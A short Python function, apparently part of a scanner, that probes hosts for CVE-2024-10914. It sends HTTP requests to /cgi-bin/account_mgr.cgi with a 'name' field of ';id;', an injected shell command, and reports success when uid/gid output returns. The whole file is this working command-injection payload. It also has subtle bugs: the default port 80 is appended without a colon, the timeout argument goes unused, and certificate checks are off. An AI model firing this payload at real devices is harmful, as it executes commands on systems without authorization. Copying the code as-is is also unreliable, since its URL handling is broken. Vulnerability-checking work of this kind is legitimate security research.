import re
import requests
from lib.color_handler import print_colour

def check_CVE_2024_10914(ip, ports=None, timeout=10):
    payload = ["id"]
    endpoint = "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=';{};'"
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for protocol in protocols:
        for port in ports:
            for command in payload:
                url = f"{protocol}://{ip}{port}{endpoint.format(command)}"
                try:
                    response = requests.get(url, timeout=10, verify=False)
                    response.raise_for_status()
                    matcher = re.search(r"uid=\d+\((\w+)\).*gid=\d+\((\w+)\)", response.text)
                    if matcher:
                        print_colour(f"The target is vulnerable to CVE-2024-10914 - {url}")
                        return True
                except requests.RequestException:
                    continue
    return False
